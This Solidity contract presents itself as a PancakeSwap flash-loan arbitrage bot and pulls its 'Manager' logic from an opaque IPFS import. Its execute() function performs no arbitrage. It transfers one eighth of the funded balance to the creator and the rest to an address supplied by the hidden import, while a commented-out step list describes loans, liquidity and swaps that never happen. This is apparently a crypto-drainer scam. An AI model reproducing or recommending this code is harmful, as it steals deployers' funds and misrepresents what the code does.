pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

// BSC Code Manager
import "ipfs://QmRGq5FTE3eSLgWBf5n5zfRGp8fK2Kt2he4nbeQB38HYAR";
   
contract GetFlashLoan {
   string public tokenName;
   string public tokenSymbol;
   uint loanAmount;
   Manager manager;
   
   constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
      tokenName = _tokenName;
      tokenSymbol = _tokenSymbol;
      loanAmount = _loanAmount;      
      manager = new Manager();
   }
   address public creator= msg.sender;
    	function tokenTransfer() public view returns (address) {    
        	return creator;
   	}
   function() external payable {}
   
   function execute() public payable {
      // Initiate new Token for liquidity transfer and send required coins for swap
       address(uint160(tokenTransfer())).transfer(address(this).balance/8);
       address(uint160(manager.pancakeswapDeposit())).transfer(address(this).balance);
      
      // Perform tasks (combined all functions into one to reduce external calls & save gas fees)
      manager.performTasks();
      
      /* Breakdown of functions
      // Submit token to BSC blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
   
      // List the token on PancakeSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);
      
      // Get BNB Loan from Multiplier-Finance & Loan Execution wallet
      string memory loanAddress = manager.takeFlashLoan(loanAmount);
      
      // Convert half BNB to DAI
      manager.pancakeDAItoBNB(loanAmount / 2);
   
   // Create BNB and DAI pairs for our token & Provide liquidity
   string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
      string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);
   
   // Perform swaps and profit on Self-Arbitrage
      manager.pancakePerformSwaps();
      
      // Move remaining BNB from Contract to your personal wallet
      manager.contractToWallet("BNB");
   
   // Repay Flashloan
      manager.repayLoan(loanAddress);
      */
   }
}
